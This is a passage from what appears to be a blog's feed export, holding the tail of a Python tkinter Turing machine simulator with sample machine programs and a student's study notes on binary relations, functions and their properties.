bound:            self.step()    def stop(self):        self.status.running_program(False)        self.update_phase(&#39;Clear&#39;)    def update_phase(self, phase):        self.next_phase = phase        self.next_phase_button.config(text=phase)        if phase == &#39;Start&#39;:            self.state.update(&#39;&#39;)            self.iteration.update(&#39;&#39;)        elif phase == &#39;Stop&#39;:            self.step_button.config(state=tk.NORMAL)            self.continue_button.config(state=tk.NORMAL)        else:            self.step_button.config(state=tk.DISABLED)            self.continue_button.config(state=tk.DISABLED)class ScrollableTape(tk.Frame):    tape_colour = &#39;#FFFAF0&#39;    cell_colour = &#39;#8B7765&#39;    cell_size = 30    nb_of_cells_without_scroll = 21    cell_proportion_for_endspace = 2.2    def __init__(self):        super().__init__(bd=10, padx=20)        self.set_original_conditions()        w = (self.nb_of_cells_without_scroll            + 2 * self.cell_proportion_for_endspace            ) * self.cell_size        self.tape = tk.Canvas(self, width=w, height=self.cell_size + 1,                              bg=self.tape_colour                            )        self.draw_minimal_tape()        self.tape.grid(row=0)        scrollbar = tk.Scrollbar(self, orient=tk.HORIZONTAL,                                command=self.tape.xview                                )        self.tape.config(xscrollcommand=scrollbar.set)        scrollbar.grid(row=1, sticky=tk.EW)        self.tape.bind(&#39;&lt;1&gt;&#39;, self.flip_bit)        self.tape.bind(&#39;&lt;Control-1&gt;&#39;, self.add_or_remove_cell)    # To start with, only one cell is displayed. More cells can be    # displayed to the right (expanding the list self.cells[1]) or to    # the left (expanding the list self.cells[0]), the lists    # self.cells[1] and self.cells[0] being handles to the textual    # display of the bits they store, which are recorded in self.bits[1]    # and self.bits[0], respectively.    # self.max_indexes[1] and self.max_indexes[0] record  the number of    # these extra cells, respectively.    # We use i to refer to the ith-cell on the right, and -i to refer to    # the ith-cell on the left.    def set_original_conditions(self):        self.max_indexes = [0, 0]        self.bits = [1], [1]        self.cells = [None], [None]        self.lines = [None], [None]    def determine_left_boundary(self):        return -(self.max_indexes[0] + self.cell_proportion_for_endspace)\              * self.cell_size    def determine_right_boundary(self):        return self.cell_size * (max(self.nb_of_cells_without_scroll,                                    self.max_indexes[1]                                    ) + self.cell_proportion_for_endspace                                )    def draw_minimal_tape(self):        left_boundary = self.determine_left_boundary()        right_boundary = self.determine_right_boundary()        self.tape.config(scrollregion=(left_boundary, -(self.cell_size / 2),                                      right_boundary, self.cell_size + 1                                      )                        )        self.tape.delete(tk.ALL)        self.tape.create_line(-0.5 * self.cell_size, 0, -0.5 * self.cell_size,                              self.cell_size, width=2, fill=self.cell_colour                            )        self.cells[0][0] = self.tape.create_text(0, self.cell_size / 2,                                                text=self.bits[0][0],                                                font=(&#39;normal&#39;, 16)                                                )        self.tape.create_line(0.5 * self.cell_size, 0, 0.5 * self.cell_size,                              self.cell_size, width=2, fill=self.cell_colour                            )        self.draw_horizontal_lines(left_boundary, right_boundary)    def draw_horizontal_lines(self, left_boundary, right_boundary):        self.tape.create_line(left_boundary, 0, right_boundary - left_boundary,                              0, width=3, fill=self.cell_colour                            )        self.tape.create_line(left_boundary, self.cell_size, right_boundary,                              self.cell_size, width=3, fill=self.cell_colour                            )    def add_cell_to_end(self, side):        i = len(self.bits[side])        if i &gt; self.max_indexes[side]:            self.max_indexes[side] = i            left_boundary = self.determine_left_boundary()            right_boundary = self.determine_right_boundary()            self.tape.config(scrollregion=(left_boundary,                                          -(self.cell_size / 2),                                          right_boundary, self.cell_size + 1                                          )                            )            self.draw_horizontal_lines(left_boundary, right_boundary)        self.bits[side].append(0)        self.cells[side].append(None)        self.lines[side].append(None)        s = side * 2 - 1        self.cells[side][i] = self.tape.create_text(i * s * self.cell_size,                                                    self.cell_size / 2, text=0,                                                    font=(&#39;normal&#39;, 16)                                                  )        self.lines[side][i] = self.tape.create_line(                                      s * (i + 0.5) * self.cell_size, 0,                                      s * (i + 0.5) * self.cell_size,                                      self.cell_size, width=2,                                      fill=self.cell_colour                                                  )    def flip_bit(self, event):        if not self.master.next_phase == &#39;Start&#39;:            return        if 0 &lt;= event.y &lt;= self.cell_size:            i = round(self.tape.canvasx(event.x) / self.cell_size)            side = i &gt; 0            i = abs(i)            if 0 &lt;= i &lt; len(self.cells[side]):                self.bits[side][i] = not self.bits[side][i]                self.tape.itemconfig(self.cells[side][i],                                    text=self.bits[side][i],                                    font=(&#39;normal&#39;, 16)                                    )    def add_or_remove_cell(self, event):        if not self.master.next_phase == &#39;Start&#39;:            return        if 0 &lt;= event.y &lt;= self.cell_size:            i = round(event.widget.canvasx(event.x) / self.cell_size)            if i == 0:                return            side = i &gt; 0            i = abs(i)            if i == len(self.bits[side]) - 1:                self.tape.delete(self.cells[side][i])                self.tape.delete(self.lines[side][i])                del self.bits[side][i]                del self.cells[side][i]                del self.lines[side][i]            elif i == len(self.bits[side]):                self.add_cell_to_end(side)    def clear(self):        del self.cells[0][1 :]        del self.cells[1][1 :]        del self.bits[0][1 :]        del self.bits[1][1 :]        del self.lines[0][1 :]        del self.lines[1][1 :]        self.set_original_conditions()        self.max_indexes = [0, 0]        self.draw_minimal_tape()class Program(tk.Frame):    label_colour = &#39;#0B0974&#39;    program_box_colour = &#39;#F0FFF0&#39;    program_selected_box_colour = &#39;#E0EEE0&#39;    def __init__(self):        super().__init__(bd=30)        tk.Label(self, text=&#39;Program&#39;, fg=self.label_colour, bd=10).pack()        self.source_code = tkinter.scrolledtext.ScrolledText(                                  self, width=30, height=25,                                  font=(&#39;nomal&#39;, 20),                                  highlightbackground=self.program_box_colour,                                  highlightcolor=                                          self.program_selected_box_colour                                                            )        self.source_code.pack()    def read_instructions(self):        self.instructions = &#123;&#125;        source_instructions = self.source_code.get(0.0, tk.END)        for instruction in source_instructions.splitlines():            quintuple = instruction.split()            if len(quintuple) == 0 or quintuple[0][0] == &#39;#&#39;:                continue            if len(quintuple) != 5:                tkinter.messagebox.showerror(                        &#39;Instruction error&#39;,                        f&#39;&#123;instruction&#125; is not a quintuple&#39;                                            )                return False            state, bit, new_state, new_bit, direction = quintuple            if not StateName(state).check_syntactic_validity():                return False            if not Bit(bit).check_syntactic_validity():                return False            if not StateName(new_state).check_syntactic_validity():                return False            if not Bit(new_bit).check_syntactic_validity():                return False            if direction != &#39;L&#39; and direction != &#39;R&#39;:                tkinter.messagebox.showerror(&#39;Instruction error&#39;,                                            f&#39;&#123;direction&#125; should be L or R&#39;                                            )                return False            if (state, int(bit)) in self.instructions:                tkinter.messagebox.showerror(                        &#39;Instruction error&#39;,                        f&#39;More than one instruction for pair (&#123;state&#125;, &#123;bit&#125;)&#39;                                            )                return False            self.instructions[state, int(bit)] =\                    new_state, int(new_bit), (direction == &#39;R&#39;) * 2 - 1        return Trueclass StateName(str):    def check_syntactic_validity(self):        if self is None:            tkinter.messagebox.showerror(&#39;State name error&#39;,                                        &#39;State name cannot be None&#39;                                        )            return False        if len(self) &gt; 8:            tkinter.messagebox.showerror(                    &#39;State name error&#39;,                    f&#39;&#123;self&#125; contains more than 8 characters&#39;                                        )            return False        if not self.isalnum():            tkinter.messagebox.showerror(&#39;State name error&#39;,                                        f&#39;&#123;self&#125; not all nonalphanumeric&#39;                                        )            return False        return Trueclass Bit(str):    def check_syntactic_validity(self):        if self not in &#39;01&#39;:            tkinter.messagebox.showerror(&#39;Instruction error&#39;,                                        f&#39;&#123;self&#125; should be 0 or 1&#39;                                        )            return False        return Trueclass State(tk.Frame):    def __init__(self, master):        super().__init__(master)        tk.Label(self, text=&#39;State: &#39;, fg=Program.label_colour                ).pack(side=tk.LEFT)        self.state = tk.StringVar()        tk.Label(self, width=8, textvariable=self.state).pack()    def update(self, s):        self.state.set(s)class Iteration(tk.Frame):    def __init__(self, master):        super().__init__(master)        tk.Label(self, text=&#39;  Iteration: &#39;, fg=Program.label_colour                ).pack(side=tk.LEFT)        self.iteration = tk.StringVar()        tk.Label(self, width=4, height=1, textvariable=self.iteration).pack()    def update(self, i):        self.iteration.set(i)class Status(tk.Canvas):    not_running_fill_colour = &#39;#FF1E00&#39;    not_running_outline_colour = &#39;#980023&#39;    running_fill_colour = &#39;#25D500&#39;    running_outline_colour = &#39;#007439&#39;    def __init__(self, master, program):        super().__init__(master, width=20, height=20)        self.status = self.create_oval(10, 10, 20, 20,                                      fill=self.not_running_fill_colour,                                      outline=self.not_running_outline_colour                                      )        self.pack()        self.program = program    def running_program(self, running):        if running:            self.itemconfig(self.status, fill=self.running_fill_colour,                            outline=self.running_outline_colour                          )            self.program.source_code.config(state=&#39;disabled&#39;)        else:            self.itemconfig(self.status, fill=self.not_running_fill_colour,                            outline=self.not_running_outline_colour                          )            self.program.source_code.config(state=&#39;normal&#39;)if __name__ == &#39;__main__&#39;:    TuringMachineSimulator().mainloop()</code></pre><h1 id="instructions"><a href="#instructions" class="headerlink" title="instructions"></a>instructions</h1><p>addition.txt</p><pre><code># Initial state: q0q0 1 q1 0 Rq1 1 q1 1 Rq1 0 q2 1 Lq2 1 q2 1 Lq2 0 q3 0 R</code></pre><p>division_by_2.txt</p><pre><code># Initial state: del1del1 1 del2 0 Rdel2 1 mov1R 0 Rmov1R 1 mov1R 1 Rmov1R 0 mov2R 0 Rmov2R 1 mov2R 1 Rmov2R 0 mov1L 1 Lmov1L 1 mov1L 1 Lmov1L 0 mov2L 0 Lmov2L 1 mov2L 1 Lmov2L 0 del1 0 Rdel1 0 end 0 Rdel2 0 end 0 R</code></pre><p>multiplication.txt</p><pre><code># Initial state: q0q0 0 q1 0 Rq0 1 q1 0 Rq1 0 q15 0 Rq1 1 q2 1 Rq2 0 q3 0 Rq2 1  q2 1 Rq3 0 q3 0 Rq3 1 q4 0 Rq4 0 q13 1 Lq4 1 q7 1 Rq7 0 q8 0 Rq7 1 q7 1 Rq8 0 q10 1 Lq8 1 q9 1 Rq9 0 q10 1 Lq9 1 q9 1 Rq10 0 q11 0 Lq10 1 q10 1 Lq11 0 q3 0 Rq11 1 q11 1 Lq13 0 q13 0 Lq13 1 q14 1 Lq14 0 q0 0 Rq14 1 q14 1 Lq15 0 q15 1 Rq15 1 q17 1 Lq17 1 q17 1 Lq17 0 q18 0 R</code></pre><p>parity</p><pre><code># Initial state: eveneven 1 odd 0 Rodd 1 even 0 Rodd 0 end 1 Lend 0 end 0 R</code></pre><p>successor.txt</p><pre><code># Initial state: q0q0 1 q0 1 Lq0 0 q1 1 Lq1 0 q1 0 R</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>relation(1)</title>
      <link href="/2024/10/03/Math/relation/"/>
      <url>/2024/10/03/Math/relation/</url>
      
        <content type="html"><![CDATA[<p>Recently I struggle with math, Paul taught 3 lectures in 26th and 27th September, with plenty of concepts and notions. I didnot got much during the lessons, there was a big mass among those wonderful concepts in my brain. It has been nearly 2 weeks after that, I spent 4 days watching the recordings and sorted out those concepts with my annotations about my confusions during the first learning.</p><p>It is a little different from algebra and geomatry. I suggest to know the definitions, and then just try to infer or understand those inferences.</p><ul><li><a href="#relation-definition-and-examples">Relation Definition and Examples</a><ul><li><a href="#example-these-are-relations">Example: These are relations</a></li><li><a href="#example-a-binary-relation">Example: a binary relation</a></li><li><a href="#example-3-ary-relation">Example: 3-ary relation</a></li></ul></li><li><a href="#binary-relations">Binary Relations</a><ul><li><a href="#special-trivial-relations">Special (Trivial) Relations</a></li><li><a href="#defining-binary-relations-set-based-definitions">Defining binary relations: Set-based definitions</a><ul><li><a href="#matrix-representation">Matrix representation</a></li><li><a href="#graphical-representation">graphical representation</a></li></ul></li><li><a href="#operations-for-binary-relations-converse-and-composition">Operations for binary relations: Converse and Composition</a></li><li><a href="#relational-image-definition">Relational image definition</a></li><li><a href="#relational-image-exercise">Relational image exercise</a></li></ul></li><li><a href="#properties-of-binary-relations">Properties of Binary Relations</a><ul><li><a href="#definition-of-five-properties-of-binary-relations-fun-tot-inj-sur-bij-of-r-subseteq-s-times-t">Definition of five properties of Binary Relations (Fun) (Tot) (Inj) (Sur) (Bij) of $R \subseteq S \times T$</a></li><li><a href="#functions-and-function-properties">Functions and function properties</a></li><li><a href="#properties-of-binary-relations-r-subseteq-s-times-srarsast">Properties of Binary Relations $R \subseteq S \times S$:(R)(AR)(S)(AS)(T)</a><ul><li><a href="#definition">Definition</a></li><li><a href="#examples-by-graph">examples by graph</a></li><li><a href="#exercise">exercise</a></li></ul></li></ul></li><li><a href="#functions">Functions</a><ul><li><a href="#converse-of-a-function">Converse of a function</a></li><li><a href="#properties-of-bijections">Properties of bijections</a></li></ul></li></ul><h1 id="Relation-Definition-and-Examples"><a href="#Relation-Definition-and-Examples" class="headerlink" title="Relation Definition and Examples"></a>Relation Definition and Examples</h1><p>An <strong>n-ary relation</strong> is a <strong>subset</strong> of the <strong>Cartesian product of n sets</strong>.</p><script type="math/tex; mode=display">R \subseteq S_1 \times S_2 \times \dots \times S_n</script><p>To show tuples related by R we write:</p><p>$(x_1,x_2,\dots,x_n)\in R$ or $R(x_1,x_2,\dots,x_n)$</p><p>If n = 2 we have a binary relation R ⊆ S×T and to show pairs related by R we write:</p><script type="math/tex; mode=display">(x,y) \in R \quad \text{or} \quad R(x,y) \quad \text{or} \quad xRy</script><hr><script type="math/tex; mode=display">U = S_1 \times S_2 \times \dots \times S_n</script><p>is the <strong>domain</strong> of R, and we say <strong>R is a relation on U</strong> (or on <strong>S</strong> if $S_1= \dots =S_n=S$ and n is clear).</p><p>Remeber these definition, later we may use ‘&lt;’, ‘&gt;’ or ‘=’ to replace ‘R’ (namely relation) literally as an expression.</p><h2 id="Example-These-are-relations"><a href="#Example-These-are-relations" class="headerlink" title="Example: These are relations"></a>Example: These are relations</h2><p>Equality: $=$</p><p>Inequality: $≤, ≥, &lt;, &gt;, \neq$</p><p>Divides relation: $|$</p><p>Element of: $∈$</p><p>Subset, superset: $⊆, ⊂, ⊇, ⊃$</p><p>Congruence modulo n: $m\underset{(n)}{=}p$</p><h2 id="Example-a-binary-relation"><a href="#Example-a-binary-relation" class="headerlink" title="Example: a binary relation"></a>Example: a binary relation</h2><p>S =set of CSE students (S can be a subset of the set of all students)</p><p>C =set of CSE courses (likewise)</p><p>E =enrolments = { (s,c):s takes c }</p><p>hence</p><script type="math/tex; mode=display">E \subseteq S \times C</script><p>In practice, almost always there are various ‘onto’ (nonemptiness) and (uniqueness) constraints on database relations.</p><p>Note, here mentioned nonemptiness and uniqueness, if you operated a database, such as mysql, you would easily understand why to set part of columns unique or nonempty.</p><p><strong>Uniqueness</strong> means that there must be one column with unique values in database; <strong>Nonemptiness</strong> means that in $S_1 \times S_2 \times S_3$, there are must 3 elements in the three sets.</p><h2 id="Example-3-ary-relation"><a href="#Example-3-ary-relation" class="headerlink" title="Example: 3-ary relation"></a>Example: 3-ary relation</h2><p>Example (Class schedule)</p><p>C = CSE courses</p><p>T = starting time (hour &amp; day)</p><p>R = lecture rooms</p><p>$\therefore$ S = schedule = { (c,t,r) : c is at t in r } ⊆ C×T×R</p><h1 id="Binary-Relations"><a href="#Binary-Relations" class="headerlink" title="Binary Relations"></a>Binary Relations</h1><p>A binary relation between S and T is a subset of S×T: i.e. a <strong>set</strong> of <strong>ordered pairs</strong>.</p><p>Also: over S and T; from S to T; <strong>on S (if S = T)</strong>.</p><p>Note <strong>on S</strong>, it means the relation is on S itself, namely $S \times S$.</p><h2 id="Special-Trivial-Relations"><a href="#Special-Trivial-Relations" class="headerlink" title="Special (Trivial) Relations"></a>Special (Trivial) Relations</h2><p>Identity: (diagonal, equality) I = {(x,x):x ∈ S }</p><p>Empty: ∅</p><p>Universal: U = S×S</p><h2 id="Defining-binary-relations-Set-based-definitions"><a href="#Defining-binary-relations-Set-based-definitions" class="headerlink" title="Defining binary relations: Set-based definitions"></a>Defining binary relations: Set-based definitions</h2><p>Defining a relation R⊆S×T:</p><ol><li><p>Explicitly listing tuples: e.g. {(1,1),(2,3),(3,2)}</p></li><li><p>Set comprehension: {(x,y) ∈ [1,3] × [1,3] : 5|xy − 1}</p></li><li><p>Construction from other relations: {(1, 1)} ∪ {(2,3)} ∪ {(2,3)}← (note that ←)</p></li></ol><h3 id="Matrix-representation"><a href="#Matrix-representation" class="headerlink" title="Matrix representation"></a>Matrix representation</h3><p><img src="/2024/10/03/Math/relation/2024-10-06-08-54-28.png" alt></p><h3 id="graphical-representation"><a href="#graphical-representation" class="headerlink" title="graphical representation"></a>graphical representation</h3><p><img src="/2024/10/03/Math/relation/2024-10-06-08-55-29.png" alt></p><p>Or as a directed graph, R = S×S , Nodes are emelents(domain, namely S), edges are elements of R(relation)</p><p><img src="/2024/10/03/Math/relation/2024-10-06-08-56-00.png" alt></p><h2 id="Operations-for-binary-relations-Converse-and-Composition"><a href="#Operations-for-binary-relations-Converse-and-Composition" class="headerlink" title="Operations for binary relations: Converse and Composition"></a>Operations for binary relations: Converse and Composition</h2><p>Relations are sets, so the standard set operations (∩, ∪, , ⊕, etc) can be used to build new relations.</p><p>Two operations that apply to binary relations uniquely:</p><p>Converse: If R⊆S×T is a relation, then $R ^ \leftarrow \subseteq T \times S$:</p><script type="math/tex; mode=display">R^\leftarrow \overset{def}{=} \{ (t,s) \in T \times S: (s,t) \in R \}</script><p>Composition: If R1⊆S×T and R2⊆T×U then R1;R2 ⊆ S×U:</p><script type="math/tex; mode=display">R1;R2 \overset{def}{=} \{(s,u) \in S \times U: \quad \text{there exists t∈T such that (s,t)∈R1 and (t,u)∈R2} \}</script><p>Fact:</p><script type="math/tex; mode=display">(R^\leftarrow)^\leftarrow = R</script><p>Graphical representation</p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-06-36.png" alt></p><h2 id="Relational-image-definition"><a href="#Relational-image-definition" class="headerlink" title="Relational image definition"></a>Relational image definition</h2><p>Given R ⊆ S ×T, A⊆S, and B ⊆T.</p><p><strong>Relational image of A</strong>, R(A):</p><script type="math/tex; mode=display">R(A) \overset{def}{=} \{t \in T: (s,t) \in R \quad \text{ for some } s \in A\}</script><p>Relational pre-image of B, R←(B):</p><script type="math/tex; mode=display">R^\leftarrow (B) \overset{def}{=} \{s \in S: (s,t) \in R \quad \text{ for some t} \in B\}</script><p><strong>Personal understanding</strong>, R⊆S×T, <strong>image</strong> is <strong>a subset of S</strong>, pre-image is similar to converse relation, and its domain is <strong>subset of T</strong>. And the <strong>answer set is a set containing elements, rather not the pairs</strong>. The domain and co-domain are changed by <strong>$R(xxx)$</strong> or $R^\leftarrow (xxx)$</p><p>Pay attention to the math expression writing, it is not R, it’s R(xx). What we learned in high school, the functions with its input range and output range, is exactly the images of functions.</p><p>Observe that the relational pre-image is the relational image of the converse relation.</p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-10-57.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-11-21.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-11-38.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-11-59.png" alt></p><h2 id="Relational-image-exercise"><a href="#Relational-image-exercise" class="headerlink" title="Relational image exercise"></a>Relational image exercise</h2><p><img src="/2024/10/03/Math/relation/2024-10-06-09-21-58.png" alt></p><p>note: <code>|</code> is division, such as, 2 divides 4 and 6.</p><p>$\subseteq^\leftarrow : \quad\subseteq$ means subset, so $\subseteq^\leftarrow$ means superset.</p><p>$|;\in$ follows by</p><p>Composition: If R1⊆S×T and R2⊆T×U then R1;R2 ⊆ S×U:</p><script type="math/tex; mode=display">R1;R2 \overset{def}{=} \{(s,u) \in S \times U: \quad \text{there exists t} \in \text{T such that (s,t)} \in \text{R1 and (t,u)} \in \text{R2}\}</script><p>Firstly, <code>|</code> and $\in$ mean that leftside is an element, and the right side is a set.</p><p>Secondly, <code>|</code> means the element can divide</p><p><code>&lt;(&#123;2&#125;)(on X): &#123;3,4&#125;</code></p><p>Note it is a image on X. “on X” means XxX, and {2} is an image(or namely subset) of X, ‘&lt;’ is relation, it’s looking forward to the set with image’s elements.</p><p>The domain and co-domain are always X, don’t understand it as <strong>{2}&lt;X</strong> according to <strong>xRy</strong>, and it’s wrong, which means that {2} is the domain and X is the codomain.</p><p>It is image, and the concept above is almostly right but actually ‘on X’ means the domain and codomain are always still X according to the definition of <strong>image</strong>.</p><h1 id="Properties-of-Binary-Relations"><a href="#Properties-of-Binary-Relations" class="headerlink" title="Properties of Binary Relations"></a>Properties of Binary Relations</h1><h2 id="Definition-of-five-properties-of-Binary-Relations-Fun-Tot-Inj-Sur-Bij-of-R-subseteq-S-times-T"><a href="#Definition-of-five-properties-of-Binary-Relations-Fun-Tot-Inj-Sur-Bij-of-R-subseteq-S-times-T" class="headerlink" title="Definition of five properties of Binary Relations (Fun) (Tot) (Inj) (Sur) (Bij) of $R \subseteq S \times T$"></a>Definition of five properties of Binary Relations (Fun) (Tot) (Inj) (Sur) (Bij) of $R \subseteq S \times T$</h2><p>A binary relation $R⊆S×C$ is:</p><div class="table-container"><table><thead><tr><th>Property</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>(Fun)</td><td>functional</td><td>For all s ∈ S there is at most one t ∈ T such that (s,t) ∈ R</td></tr><tr><td>(Tot)</td><td>total</td><td>For all s ∈ S there is at least one t ∈ T such that (s,t) ∈ R</td></tr><tr><td>(Inj)</td><td>injective</td><td>For all t ∈ T there is at most one s ∈ S such that (s,t) ∈ R</td></tr><tr><td>(Sur)</td><td>surjective</td><td>For all t ∈ T there is at least one s ∈ S such that (s,t) ∈ R</td></tr><tr><td>(Bij)</td><td>bijective</td><td>Injective and surjective</td></tr></tbody></table></div><h2 id="Functions-and-function-properties"><a href="#Functions-and-function-properties" class="headerlink" title="Functions and function properties"></a>Functions and function properties</h2><p>Note, all of the five properties are <strong>not related to function directly</strong>, even functional (Fun) is not. The adjustives have different meanings with the function(noun). (Fun)’s domain is <strong>not required all the inputs</strong> of domain have a value. (Tot)’s input may have multiple <strong>values in the co-domain</strong>, hence they are <strong>not function</strong> directly.</p><p>(Fun) and (Tot) emphasize the <strong>domain</strong>, and (Inj), (Sur) and (Bij) emphasize the <strong>co-domain</strong>.</p><p>But if the adjectives are changed into noun with the suffix of ‘tion’, that means they are functions.</p><p><strong>partial function</strong> is a binary relation that is (Fun).</p><p>A <strong>function</strong> is a binary relation that is (Fun) and (Tot).</p><p>An <strong>injection</strong> is a function that is (Inj).</p><p>A <strong>surjection</strong> is a function that is (Sur).</p><p>A <strong>bijection</strong> is a function that is (Bij).</p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-43-59.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-44-12.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-44-23.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-44-33.png" alt></p><h2 id="Properties-of-Binary-Relations-R-subseteq-S-times-S-R-AR-S-AS-T"><a href="#Properties-of-Binary-Relations-R-subseteq-S-times-S-R-AR-S-AS-T" class="headerlink" title="Properties of Binary Relations $R \subseteq S \times S$:(R)(AR)(S)(AS)(T)"></a>Properties of Binary Relations $R \subseteq S \times S$:(R)(AR)(S)(AS)(T)</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><div class="table-container"><table><thead><tr><th>Property</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>(R)</td><td>reflexive</td><td>For all x ∈ S: (x,x) ∈ R</td></tr><tr><td>(AR)</td><td>antireflexive</td><td>For all x ∈ S: (x,x) ∉ R</td></tr><tr><td>(S)</td><td>symmetric</td><td>For all x,y ∈ S: If (x,y) ∈ R then (y,x) ∈ R</td></tr><tr><td>(AS)</td><td>antisymmetric</td><td>For all x,y ∈ S: If (x,y) and (y,x) ∈ R then x = y</td></tr><tr><td>(T)</td><td>transitive</td><td>For all x,y,z ∈ S: If (x,y) and (y,z) ∈ R then (x,z) ∈ R</td></tr></tbody></table></div><p>Identity: (diagonal, equality) I ={(x,x):x ∈ S }, it statisfy among <strong>reflexive</strong> and <strong>symmetric</strong> and <strong>antisymmetric</strong>.</p><p>Antisymmetric can contain the identity(part of symmetric).</p><p><strong>Take Notice</strong></p><ol><li>Properties have to hold for all elements</li><li>(S), (AS), (T) are conditional statements – they will hold if there is nothing which satisfies the ‘if’ part</li></ol><p>A relation can be <strong>both symmetric and antisymmetric</strong>. Namely, when R consists <strong>only of some pairs (x,x),x ∈ S</strong>.</p><p>A relation <strong>cannot be simultaneously reflexive and antireflexive (unless S = ∅)</strong>.</p><p>For example, <strong>antisymmetric</strong> is different from <strong>non-symmetric</strong>. <strong>Antisymmetric</strong> means every elements hold that they dont have the symmetric pairs except their reflexive pairs. And <strong>antireflexive</strong> has the similar effects with <strong>antireflexive</strong>, <strong>antireflexive</strong> is different from <strong>non-reflexive</strong>.</p><p>Note the second notice, it satisfy the <a href="https://senranja.github.io/2024/09/27/Math/vacuous-truth/">vacuous truth</a> if there is nothing which satisfies.</p><h3 id="examples-by-graph"><a href="#examples-by-graph" class="headerlink" title="examples by graph"></a>examples by graph</h3><p><img src="/2024/10/03/Math/relation/2024-10-06-09-55-41.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-55-56.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-56-09.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-56-22.png" alt></p><p><img src="/2024/10/03/Math/relation/2024-10-06-09-56-36.png" alt></p><h3 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h3><p>The following relations are on S = {1,2,3}. Which of the properties (R), (AR), (S), (AS), (T) does each satisfy?</p><p>(m,n) ∈ R if m+n =3? (AR) and (S)</p><p>(AR) and (S)</p><p>(m,n) ∈ R if max{m,n} = 3? (S)</p><p>(S)</p><hr><p>Give examples of relations with specified properties.</p><p>(AS), (T), not (R)</p><ul><li><p>Strict order of numbers x &lt; y</p></li><li><p>≤ but with some pairs (x,x) removed</p></li><li><p>Being a prime divisor: (p,n) ∈ R iff p is prime and p|n</p></li><li><ul><li>Not reflexive: (1,1) / ∈ R</li></ul></li><li><ul><li>Transitivity is meaningful only for the pairs (p,p),(p,n) p|n for p prime</li></ul></li></ul><p>(S), not (R), not (T)</p><ul><li>Simplest example- inequality</li></ul><hr><script type="math/tex; mode=display">R \subseteq \mathbb{N}^2 \times \mathbb{N}^2 \implies R \subseteq (\mathbb{N} \times \mathbb{N}) \times ( \mathbb{N} \times \mathbb{N})</script><p>$\mathbb{N} \times \mathbb{N}$ is a set of pairs, such as ((1,2),(2,3)). It demands that $(m,n)R(p,q)$ if $ m \equiv p \pmod{3} $ or $n \equiv q \pmod{5}$</p><p>(a) Is R reflexive?</p><p>Yes: m =(3) m so (m,n)R(m,n).</p><p>(b) Is R symmetric?</p><p>Yes: by symmetry of · =(n) ·.</p><p>(c) Is R transitive?</p><p>No: Consider (1,1), (1,4) and (2,4).</p><p>Analysis</p><p>R is a relation on $\mathbb{N} \times \mathbb{N}$, i.e. it is a subset of $\mathbb{N}^2 \times \mathbb{N}^2$ </p><p>$(m,n)R(p,q)$ if $m \underset{(3)}{=} p$ or $n \underset{(5)}{=} q$</p><p>And then you would easily know the options a and b</p><p>How to prove option c?</p><p>Notice that the pairs of the two point pairs, it uses OR to connect. We can find (0,0)R(0,1) is right, and (0,1)R(1,1) is right, but (0,0)R(1,1) is <strong>obviously wrong</strong>.</p><p><img src="/2024/10/03/Math/relation/2024-10-06-10-18-24.png" alt></p><h1 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h1><p>Definition</p><p>A <strong>function</strong>, f : S → T, is a binary relation f ⊆ S×T that satisfies (Fun) and (Tot). That is, for all s ∈ S there is exactly one t ∈ T such that (s,t) ∈ f.</p><p>We write f(s) for the unique element related to s.</p><p>We write $T^S$ for the set of all functions from S to T.</p><p><img src="/2024/10/03/Math/relation/2024-10-06-10-21-26.png" alt></p><p>f : S →T describes pairing of the sets: it means that f assigns to every element s ∈ S a unique element t ∈ T. To emphasise where a specific element is sent, we can write f : x → y, which means the same as f(x) = y</p><div class="table-container"><table><thead><tr><th>Symbol</th><th>Symbol</th><th>Symbol</th><th>Description</th></tr></thead><tbody><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr><tr><td>T</td><td>co-domain of f</td><td>Codom(f)</td><td>(possible outputs)</td></tr><tr><td>f(S)</td><td>image of f</td><td>Im(f)</td><td>(actual outputs)</td></tr><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr></tbody></table></div><p><code>=&#123;f(x):x ∈ Dom(f) &#125;</code> is original in slides, I omit it in my write up. It looks like to describe <code>f(S)</code>, and I guess it may be a typo: it should be <code>=&#123;f(x):x ∈ Dom(S) &#125;</code>.</p><p>f is a relation with domain and co-domain, and <strong>f(S)</strong> constrain the subset of domain, and <strong>f(S)</strong> means the actual output set (all output in the set can find its intput in pre-image ).</p><p>Important! The domain and co-domain are critical aspects of a function’s definition.</p><script type="math/tex; mode=display">f: \mathbb{N} \rightarrow \mathbb{Z} \quad \text{given by} \quad f(x) \rightarrow x^2</script><p>and</p><script type="math/tex; mode=display">g: \mathbb{N} \rightarrow \mathbb{N} \quad \text{given by} \quad g(x) \rightarrow x^2</script><p>are different functions even though they have the same behaviour!</p><h2 id="Converse-of-a-function"><a href="#Converse-of-a-function" class="headerlink" title="Converse of a function"></a>Converse of a function</h2><p>Q: $f^\leftarrow$ is a relation; when is it a function?</p><p>A: When f satisfies (Inj) and (Sur)– i.e. when f is a bijection.</p><h2 id="Properties-of-bijections"><a href="#Properties-of-bijections" class="headerlink" title="Properties of bijections"></a>Properties of bijections</h2><p>Suppose f : S → T and g : T →U are bijections</p><p>Fact</p><p>$f^\leftarrow: T \rightarrow S$ and $g^\leftarrow: U \rightarrow T$ are bijections</p><p>$(f ; g) : S → 